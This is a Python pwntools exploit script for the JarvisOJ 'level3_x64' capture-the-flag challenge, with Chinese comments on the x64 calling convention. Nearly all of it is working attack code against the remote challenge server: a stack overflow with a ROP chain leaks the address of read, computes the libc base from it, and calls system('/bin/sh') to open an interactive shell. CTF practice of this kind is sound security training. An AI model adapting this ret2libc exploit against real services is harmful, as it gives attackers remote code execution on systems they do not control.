#!/usr/bin/env python
# coding=utf-8
from pwn import *
from LibcSearcher import *
nc='pwn2.jarvisoj.com'
point = 9883
p= ELF('./level3_x64')
#a= process('./level3_x64')
#a = remote("localhost", 12345)
a = remote(nc,point)
#junk = "A"*0x8c
'''
x86中参数都是保存在栈上,但在x64中前六个参数依次保存在RDI, RSI, RDX, RCX, R8和R9寄存器里

如果还有更多的参数的话才会保存在栈上

所以我们需要寻找一些类似于pop rdi; ret的这种gadget

000000000400542: or ah, byte ptr [rax]; jmp rax; 
0x00000000004006ac: pop r12; pop r13; pop r14; pop r15; ret; 
0x00000000004006ae: pop r13; pop r14; pop r15; ret; 
0x00000000004006b0: pop r14; pop r15; ret; 
0x00000000004006b2: pop r15; ret; 
0x000000000040053f: pop rbp; mov edi, 0x600a88; jmp rax; 
0x00000000004006ab: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; 
0x00000000004006af: pop rbp; pop r14; pop r15; ret; 
0x0000000000400550: pop rbp; ret; 
0x00000000004006b3: pop rdi; ret; 关键函数
0x00000000004006b1: pop rsi; pop r15; ret; 关键函数
0x00000000004006ad: pop rsp; pop r13; pop r14; pop r15; ret;
'''
pop_rdi_ret = 0x4006b3
pop_rsi_pop_r15_ret=0x4006b1
payload = "A"*136
payload+=p64(pop_rdi_ret)
payload+=p64(1)
payload+=p64(pop_rsi_pop_r15_ret)
payload+=p64(p.got['read'])
payload+=p64(4)
payload+=p64(p.plt['write'])
payload+=p64(0x4005E6)
#函数返回地址

#payload = ''
#payload+=junk
#payload+=p32(0x08048320)+p32(0x08048320)+p32(addr1)
#p.send(payload)
a.send(payload)
a.recvline()

v = a.recv()
print('---------------------')
addr=(u64(v[:8]))
print (addr)
print('---------------------')
libc = ELF('./libc-2.19.so')
#libc=LibcSearcher("read", addr)
libc_base = addr - libc.symbols['read']
#print hex(libc_base)
#print hex(addr)
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + libc.search('/bin/sh\x00').next()
print hex(binsh_addr)
payload ='A' * 136+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)
a.send(payload)
a.interactive()

